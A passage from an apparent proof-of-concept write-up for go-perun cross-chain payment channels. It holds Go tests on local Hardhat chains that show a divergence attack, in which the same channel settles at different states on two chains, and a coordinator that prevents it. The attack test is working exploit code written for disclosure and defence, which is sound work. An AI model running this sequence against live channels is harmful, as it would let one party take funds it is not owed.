    require.NoError(bob.AdjB.Register(ctx, v1ReqBob, nil))
    require.NoError(poc.AdvanceTime(ctx, chainB.RPC, challengeDuration+1))
    sub2, err := bob.AdjB.Subscribe(ctx, chID); require.NoError(err)
    e := sub2.Next(); require.IsType(&channel.RegisteredEvent{}, e)
    require.NoError(e.(*channel.RegisteredEvent).TimeoutV.Wait(ctx))
    require.NoError(sub2.Close())

    // STEP 2: Bob reveals SECRET v2 on Chain A (no prior registration → accepted).
    require.NoError(bob.AdjA.Register(ctx, v2ReqBob, nil))
    require.NoError(poc.AdvanceTime(ctx, chainA.RPC, challengeDuration+1))
    sub1, err := bob.AdjA.Subscribe(ctx, chID); require.NoError(err)
    e = sub1.Next(); require.IsType(&channel.RegisteredEvent{}, e)
    require.NoError(e.(*channel.RegisteredEvent).TimeoutV.Wait(ctx))
    require.NoError(sub1.Close())

    // Each chain pays out at its locally registered state.
    require.NoError(bob.AdjA.Withdraw(ctx,   v2ReqBob,   nil))
    require.NoError(alice.AdjA.Withdraw(ctx, v2ReqAlice, nil))
    require.NoError(bob.AdjB.Withdraw(ctx,   v1ReqBob,   nil))
    require.NoError(alice.AdjB.Withdraw(ctx, v1ReqAlice, nil))
    _ = chAliceBob.Close(); _ = chBobAlice.Close()

    attackDiff := channel.Balances{
        v2Bals.Sub(initBals)[0], // Asset1 at v2
        v1Bals.Sub(initBals)[1], // Asset2 at v1
    }
    diff := channel.Balances{
        {alice.BalA.Balance(), bob.BalA.Balance()},
        {alice.BalB.Balance(), bob.BalB.Balance()},
    }.Sub(initBals)
    assert.True(ctest.EqualBalancesWithDelta(attackDiff, diff, balanceDelta),
        "divergent attack outcome: expected %v ±%v, got %v", attackDiff, balanceDelta, diff)
    t.Logf("Attack SUCCEEDED — Bob A1=%v A2=%v, Alice A1=%v A2=%v",
        diff[0][1], diff[1][1], diff[0][0], diff[1][0])
}
```

### 10.5 Defended test — coordinator over libp2p

The coordinator is constructed in-process via `service.New(...)` (see §7.1).
It still connects to the libp2p relay and accepts client notifications over
circuit streams — no separate terminal is required. The test depends on the
relay (`relay.perun.network:5574`) being reachable.

```go
// poc/coordinator_test.go
package poc_test

import (
    "context"
    "testing"
    "time"

    "github.com/stretchr/testify/assert"
    "github.com/stretchr/testify/require"
    "perun.network/go-perun/channel"
    "perun.network/go-perun/client"
    "perun.network/go-perun/wallet"
    "perun.network/go-perun/wire"
    ctest        "perun.network/go-perun/client/test"
    ethchannel   "github.com/perun-network/perun-eth-backend/channel"
    ethwallet    "github.com/perun-network/perun-eth-backend/wallet"

    poc "github.com/your-org/multiledger-poc/poc"
)

func TestAttackWithCoordinator(t *testing.T) {
    ctx, cancel := context.WithTimeout(context.Background(), 120*time.Second)
    defer cancel()
    require := require.New(t)
    assert  := assert.New(t)

    chainA, chainB, err := poc.LoadChains(); require.NoError(err)

    // Stand up the coordinator in this test process. svc.PeerID() is what the
    // participant notifiers dial; coordEthAddr is what WithCoordinator embeds.
    _, coordPeerID, coordEthAddr := poc.StartCoordinator(t, chainA, chainB)

    bus := wire.NewLocalBus()
    aliceKey, err := poc.DeriveKey(1); require.NoError(err)
    bobKey,   err := poc.DeriveKey(2); require.NoError(err)

    // Both clients dial the in-process coordinator over libp2p.
    alice := poc.NewParticipant(t, aliceKey, bus, chainA, chainB, coordPeerID)
    bob   := poc.NewParticipant(t, bobKey,   bus, chainA, chainB, coordPeerID)

    assetA := ethchannel.NewAsset(chainA.ChainID, chainA.AssetAddr)
    assetB := ethchannel.NewAsset(chainB.ChainID, chainB.AssetAddr)
    bID1   := wallet.BackendID(assetA.LedgerBackendID().BackendID())

    parts := []map[wallet.BackendID]wire.Address{alice.WireAddr, bob.WireAddr}
    initAlloc := channel.NewAllocation(2,
        []wallet.BackendID{bID1, wallet.BackendID(assetB.LedgerBackendID().BackendID())},
        assetA, assetB)
    initAlloc.Balances = initBals

    coordWalletAddr := ethwallet.Address(coordEthAddr)
    prop, err := client.NewLedgerChannelProposal(
        challengeDuration, alice.WalletAddr, initAlloc, parts,
        client.WithCoordinator(map[wallet.BackendID]wallet.Address{1: &coordWalletAddr}),
    )
    require.NoError(err)

    chans := make(chan *client.Channel, 1); errs := make(chan error, 2)
    go alice.Client.Handle(ctest.AlwaysRejectChannelHandler(ctx, errs), ctest.AlwaysAcceptUpdateHandler(ctx, errs))
    go bob.Client.Handle(ctest.AlwaysAcceptChannelHandler(ctx, bob.WalletAddr, chans, errs), ctest.AlwaysAcceptUpdateHandler(ctx, errs))

    // ProposeChannel triggers NotifyWatchLedgerChannel via the installed
    // RelayCoordinatorNotifier on BOTH participants — the coordinator now
    // watches the channel on every registered chain.
    chAliceBob, err := alice.Client.ProposeChannel(ctx, prop)
    require.NoError(err)
    var chBobAlice *client.Channel
    select {
    case chBobAlice = <-chans:
    case err := <-errs: t.Fatalf("channel open: %v", err)
    }

    // Start watchers so a dispute on one chain is replicated to the other.
    go func() { errs <- chAliceBob.Watch(alice) }()
    go func() { errs <- chBobAlice.Watch(bob) }()
    time.Sleep(100 * time.Millisecond)

    // Legitimate v1.
    done := make(chan struct{}, 1)
    chBobAlice.OnUpdate(func(_, _ *channel.State) { done <- struct{}{} })
    require.NoError(chAliceBob.Update(ctx, func(s *channel.State) { s.Balances = v1Bals }))
    <-done; time.Sleep(100 * time.Millisecond)

    v1ReqBob := client.NewTestChannel(chBobAlice).AdjudicatorReq()

    accs := []wallet.Account{alice.WalletAcc[bID1], bob.WalletAcc[bID1]}
    v2ReqBob, err := buildSecretSignedReq(v1ReqBob, v2Bals, accs, bID1, 1)
    require.NoError(err)

    chID := chAliceBob.ID()
    sub1, err := bob.AdjA.Subscribe(ctx, chID); require.NoError(err)
    sub2, err := bob.AdjB.Subscribe(ctx, chID); require.NoError(err)

    // Bob registers v1 on Chain B → watcher replicates to Chain A.
    require.NoError(bob.AdjB.Register(ctx, v1ReqBob, nil))
    e2 := sub2.Next(); require.IsType(&channel.RegisteredEvent{}, e2)
    require.NoError(poc.AdvanceTime(ctx, chainB.RPC, challengeDuration+1))
    require.NoError(e2.(*channel.RegisteredEvent).TimeoutV.Wait(ctx))
    e1 := sub1.Next(); require.IsType(&channel.RegisteredEvent{}, e1, "watcher-replicated v1 on Chain A")

    // Bob registers v2 on Chain A BEFORE Chain A's window expires.
    require.NoError(bob.AdjA.Register(ctx, v2ReqBob, nil))
    e1 = sub1.Next(); require.IsType(&channel.RegisteredEvent{}, e1, "v2 supersedes v1 on Chain A")
    _ = sub1.Close(); _ = sub2.Close()

    require.NoError(poc.AdvanceTime(ctx, chainA.RPC, challengeDuration+1))
    require.NoError(e1.(*channel.RegisteredEvent).TimeoutV.Wait(ctx))

    // The coordinator service notices both windows have elapsed, selects v2
    // (highest version), signs it, and submits coordinate() on both chains.
    // The on-chain CoordinatedEvent propagates back to both clients.
    require.Eventually(func() bool { return chAliceBob.Phase() == channel.Coordinated },
        20*time.Second, 200*time.Millisecond, "alice must reach Coordinated phase")
    require.Eventually(func() bool { return chBobAlice.Phase() == channel.Coordinated },
        20*time.Second, 200*time.Millisecond, "bob must reach Coordinated phase")

    require.NoError(chAliceBob.Settle(ctx, false))
    require.NoError(chBobAlice.Settle(ctx, false))
    require.NoError(chAliceBob.Close())
    require.NoError(chBobAlice.Close())

    diff := channel.Balances{
        {alice.BalA.Balance(), bob.BalA.Balance()},
        {alice.BalB.Balance(), bob.BalB.Balance()},
    }.Sub(initBals)
    allV2Diff := v2Bals.Sub(initBals)
    divergentDiff := channel.Balances{
        v2Bals.Sub(initBals)[0],
        v1Bals.Sub(initBals)[1],
    }
    assert.True(ctest.EqualBalancesWithDelta(allV2Diff, diff, balanceDelta),
        "coordinator must enforce uniform v2: expected %v ±%v, got %v", allV2Diff, balanceDelta, diff)
    assert.False(ctest.EqualBalancesWithDelta(divergentDiff, diff, balanceDelta),
        "divergent outcome must not occur with coordinator")
    t.Logf("Attack PREVENTED — uniform v2: Bob A1=%v A2=%v, Alice A1=%v A2=%v",
        diff[0][1], diff[1][1], diff[0][0], diff[1][0])
}
```

The defended test relies on the coordinator's event-driven flow:

```
ProposeChannel(WithCoordinator)                    ← both clients send this notification
    │
    ▼
RelayCoordinatorNotifier.NotifyWatchLedgerChannel  ← /coordinator/notify-watch-ledger/1.0.0
    │
    ▼
host.startWatchingLedger                           ← cross-chain-coordinator side
    │
    ▼
multi.Coordinator.Subscribe (per chain) → handleEventsFromChain goroutine
    │
    ▼
RegisteredEvent (Chain A v2 + Chain B v1) → handleRegisteredEvent records per-chain dispute
    │
    ▼
awaitFinalisationAndCoordinate (wall-clock timer)
    │
    ▼
coordinate(): selectCanonicalSignedState (v2 wins) → buildCoordSigs → multi.Coordinator.Coordinate
    │
    ▼
on-chain coordinate() tx on both chains → CoordinatedEvent → Phase = Coordinated
```

The wall-clock timer is intentional: the coordinator does not depend on each
chain's block production. Trade-off: tests that fast-forward chain time via
`evm_increaseTime` still sleep the full `challengeDuration` seconds in real
time, so keep `challengeDuration` small (15 s here).

---

## 11. Running the PoC

```bash
# Terminal 1 — Chain A
cd hardhat && npx hardhat node --port 8545

# Terminal 2 — Chain B
cd hardhat && npx hardhat node --port 8546

# Terminal 3 — deploy contracts (once) and run tests
cd hardhat
npx hardhat run scripts/deploy.js --network chainA
npx hardhat run scripts/deploy.js --network chainB
# → addresses.json populated

cd ..
go test -v -run TestAttackNoCoordinator   -timeout 120s ./poc/    # vulnerability demo
go test -v -run TestAttackWithCoordinator -timeout 180s ./poc/    # defended scenario

# Race detector across both:
go test -count=1 -race -timeout 240s ./poc/
```

The defended test stands up the coordinator in-process via
`service.New(...)`; only the two Hardhat nodes need to be running externally.
A reachable `relay.perun.network:5574` is required (the coordinator dials it
to accept client notifications over circuit streams).

### Expected output

```
=== RUN   TestAttackNoCoordinator
    attack_test.go: Attack SUCCEEDED — Bob A1=9e18 A2=7e18, Alice A1=1e18 A2=3e18
--- PASS: TestAttackNoCoordinator (≈30 s)

=== RUN   TestAttackWithCoordinator
    coordinator_test.go: Attack PREVENTED — uniform v2: Bob A1=9e18 A2=5e18, Alice A1=1e18 A2=5e18
--- PASS: TestAttackWithCoordinator (≈45 s)
```

The coordinator picks v2 as the canonical state (highest version seen across
all chains). The protection guarantee is **no divergence**, not necessarily
reverting to v1: Bob legitimately holds both signatures on v2, so v2 is the
honest highest version and the coordinator locks both chains to it uniformly.

---

## 12. Key invariants

| Layer              | Invariant                                                       | Enforcement                                           |
| ------------------ | --------------------------------------------------------------- | ----------------------------------------------------- |
| Contract           | `coordinate()` requires prior `register()`                      | `coordinateSingle`: `"not registered"`                |
| Contract           | `coordinate()` requires `block.timestamp ≥ dispute.timeout`     | `coordinateSingle`: `"refutation timeout not passed"` |
| Contract           | Coordinator ECDSA sig required                                  | `Channel.validateCoordinatorSignature`                |
| Contract           | `register()` rejected in `COORDINATED` phase                    | `registerSingle`: `"incorrect phase"`                 |
| Contract           | Multi-ledger `conclude()` requires `COORDINATED`                | `concludeSingle`: `"coordinated settlement required"` |
| Contract           | Coordinator-eligible requires `coordinator != 0 && multiLedger` | `MultiLedger.sol: isCoordinatedEligible`              |
| go-perun (multi)   | All chains coordinated concurrently; first error reported       | `multi.Coordinator.dispatch` (errgroup)               |
| go-perun (client)  | `Settle` calls `ensureCoordinated` before `Withdraw`            | `client.Channel.Settle`                               |
| go-perun (watcher) | Dispute replicated to all chains                                | `watcher/local` multi-ledger path                     |
| Timing             | All timeouts use `block.timestamp` (seconds)                    | `Adjudicator.sol` (use `evm_increaseTime` in tests)   |

### Timing diagram (defended scenario)

```
         t0          t1 (B frozen)       t2      t3 (A frozen)     t4
Chain B:  register(v1)──[window: 15 s]──timeout────────────────── COORDINATED(v2)──CONCLUDED
                                            │                            ↑
Chain A:  register(v1)─── register(v2) ────│─[window: 15 s]──timeout───┘
          ↑ watcher          ↑ Bob          │                       coordinator
          replication        (before A      │                       service calls
                             window closes) │                       coordinate(v2)
                                            │                       on both chains
```

Key sequencing: Chain B's window expires first (t1). Only then does Bob
register v2 on Chain A (still within Chain A's open window). Chain A's window
expires (t3) with v2 frozen. The coordinator then picks v2 as canonical and
locks both chains to v2 (t4). After both chains report `COORDINATED`,
`Channel.Settle → ensureCoordinated` is a no-op and `Withdraw` succeeds at the
uniform v2 outcome.
